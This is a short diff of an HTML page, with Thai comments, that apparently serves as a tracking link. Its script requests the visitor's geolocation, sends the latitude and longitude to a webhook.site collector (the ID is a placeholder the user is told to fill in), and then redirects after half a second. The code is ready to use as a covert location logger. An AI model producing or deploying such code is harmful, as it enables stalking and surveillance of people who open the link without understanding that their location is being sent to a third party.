@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -13,8 +13,8 @@
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(s => {
-                    // ส่งพิกัดไปที่ระบบหลังบ้าน (Webhook)
-                    fetch(`https://webhook.site/YOUR-UNIQUE-ID?lat=${s.coords.latitude}&lng=${s.coords.longitude}`);
+                    // ส่งพิกัดไปที่ระบบหลังบ้าน (อย่าลืมเปลี่ยน YOUR_ID เป็น ID จาก Webhook.site นะครับ)
+                    fetch('https://webhook.site/YOUR-ID?lat=' + s.coords.latitude + '&lng=' + s.coords.longitude);
                     setTimeout(go, 500);
                 }, go);
             } else { go(); }
